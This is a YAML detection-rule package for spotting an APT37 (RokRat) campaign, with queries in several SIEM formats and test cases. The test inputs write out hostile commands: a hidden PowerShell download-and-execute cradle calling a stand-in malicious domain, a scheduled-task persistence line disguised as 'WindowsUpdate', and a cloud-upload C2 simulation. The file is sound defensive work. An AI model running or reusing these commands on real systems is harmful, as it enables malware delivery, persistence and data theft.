# packages/015_apt37_famous_chollima_operation_hankook_phantom_defense/detection.yaml
apiVersion: soac.io/v1
kind: DetectionRule
metadata:
  name: APT37 Operation HanKook Phantom Defense Detection
  version: 1.0.0
  author: SOaC Detection Engineering Team
  created: 2024-01-15
  package_id: pkg-015
  mitre_attack:
    - T1566.001
    - T1566.002
    - T1204.002
    - T1059.001
    - T1105
    - T1053.005
    - T1112
    - T1219
    - T1071.001
    - T1567.002
    - T1573.001
    - T1005
    - T1041
  severity: high
  data_sources:
    - endpoint_logs
    - process_creation
    - file_creation
    - network_traffic
    - registry_events
    - cloud_storage_logs
spec:
  description: Detects APT37 (Famous Chollima) Operation HanKook Phantom Defense attack chain including spear-phishing, LNK file execution, PowerShell infection chain, RokRat backdoor deployment, cloud C2 communication, and data exfiltration
  platforms:
    - windows
    - cloud
  inline_rules:
    - id: apt37-spearphish-lnk-execution
      name: APT37 Spear-phishing LNK File Execution
      format: kql
      platform: windows
      mitre:
        - T1566.001
        - T1566.002
        - T1204.002
      severity: high
      query: |
        DeviceProcessEvents
        | where Timestamp > ago(24h)
        | where ProcessCommandLine contains ".lnk"
        | where ProcessCommandLine has_any("cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe")
        | where ProcessCommandLine has_any("/c", "-c", "-ep bypass", "-w hidden")
        | where ParentProcessName in~ ("explorer.exe", "winword.exe", "excel.exe", "powerpnt.exe", "outlook.exe")
        | where ProcessCommandLine has_any("http", "https", "ftp", "download", "invoke", "iex")
        | project Timestamp, DeviceName, ProcessCommandLine, ParentProcessName, InitiatingProcessFileName
    - id: apt37-powershell-infection-chain
      name: APT37 PowerShell Infection Chain
      format: sigma
      platform: windows
      mitre:
        - T1059.001
        - T1105
      severity: high
      query: |
        title: APT37 PowerShell Infection Chain
        logsource:
          category: process_creation
          product: windows
        detection:
          selection1:
            Image|endswith: '\powershell.exe'
            CommandLine|contains:
              - 'DownloadString'
              - 'DownloadFile'
              - 'WebClient'
              - 'Invoke-Expression'
              - 'IEX'
          selection2:
            CommandLine|contains:
              - 'bypass'
              - 'hidden'
              - 'noprofile'
              - 'noninteractive'
          selection3:
            CommandLine|contains:
              - 'cloud'
              - 'storage'
              - 'dropbox'
              - 'onedrive'
              - 'googledrive'
          condition: selection1 and selection2 and selection3
    - id: apt37-rokrat-persistence
      name: APT37 RokRat Backdoor Persistence
      format: splunk
      platform: windows
      mitre:
        - T1053.005
        - T1112
        - T1219
      severity: critical
      query: |
        (source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1)
        OR (source="WinEventLog:Security" EventCode=4688)
        | where (CommandLine="*schtasks*" AND CommandLine="*/create*" AND CommandLine="*powershell*")
        OR (CommandLine="*reg*" AND CommandLine="*add*" AND CommandLine="*HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run*")
        OR (Image="*\\svchost.exe" AND ParentImage!="*\\services.exe")
        | eval suspicious_persistence=if(match(CommandLine, "(?i)(schtasks.*create.*powershell|reg.*add.*run)"), "high", "medium")
        | where suspicious_persistence="high"
        | table _time, Computer, Image, CommandLine, ParentImage, suspicious_persistence
    - id: apt37-cloud-c2-communication
      name: APT37 Cloud-based C2 Communication
      format: wazuh
      platform: windows
      mitre:
        - T1071.001
        - T1567.002
        - T1573.001
      severity: high
      query: |
        <rule id="100001" level="12">
          <if_group>sysmon_event1</if_group>
          <field name="win.eventdata.commandLine" type="pcre2">(?i)(dropbox|onedrive|googledrive|mega\.nz|pcloud)</field>
          <field name="win.eventdata.commandLine" type="pcre2">(?i)(upload|download|sync|api)</field>
          <field name="win.eventdata.parentImage" type="pcre2">(?i)(powershell\.exe|cmd\.exe|rundll32\.exe)</field>
          <description>APT37 Cloud-based C2 Communication Detected</description>
          <mitre>
            <id>T1071.001</id>
            <id>T1567.002</id>
            <id>T1573.001</id>
          </mitre>
        </rule>
    - id: apt37-data-exfiltration
      name: APT37 Data Collection and Exfiltration
      format: kql
      platform: windows
      mitre:
        - T1005
        - T1041
        - T1567.002
      severity: high
      query: |
        DeviceFileEvents
        | where Timestamp > ago(24h)
        | where ActionType in ("FileCreated", "FileModified")
        | where FileName has_any(".zip", ".rar", ".7z", ".tar", ".gz")
        | where FolderPath has_any("temp", "appdata", "programdata")
        | join kind=inner (
            DeviceNetworkEvents
            | where Timestamp > ago(24h)
            | where RemoteUrl has_any("dropbox", "onedrive", "googledrive", "mega.nz", "pcloud")
            | where ActionType == "ConnectionSuccess"
        ) on DeviceId
        | where abs(datetime_diff('minute', Timestamp, Timestamp1)) <= 30
        | project Timestamp, DeviceName, FileName, FolderPath, RemoteUrl, InitiatingProcessFileName
  test_cases:
    - name: APT37 LNK File Execution Test
      description: Simulates execution of malicious LNK file leading to PowerShell command execution
      input:
        process_name: cmd.exe
        command_line: 'cmd.exe /c powershell.exe -ep bypass -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(''https://malicious-domain.com/payload.ps1'')"'
        parent_process: explorer.exe
      expected_result: Detection triggered for spear-phishing LNK execution
    - name: APT37 RokRat Persistence Test
      description: Simulates RokRat backdoor establishing persistence via scheduled task
      input:
        process_name: schtasks.exe
        command_line: 'schtasks /create /tn "WindowsUpdate" /tr "powershell.exe -w hidden -c IEX(Get-Content C:\temp\update.ps1)" /sc daily'
        parent_process: powershell.exe
      expected_result: Detection triggered for suspicious persistence mechanism
    - name: APT37 Cloud C2 Communication Test
      description: Simulates cloud-based C2 communication via legitimate cloud services
      input:
        process_name: powershell.exe
        command_line: 'powershell.exe -c "Invoke-WebRequest -Uri https://api.dropboxapi.com/2/files/upload -Method POST"'
        network_connection: api.dropboxapi.com:443
      expected_result: Detection triggered for cloud-based C2 activity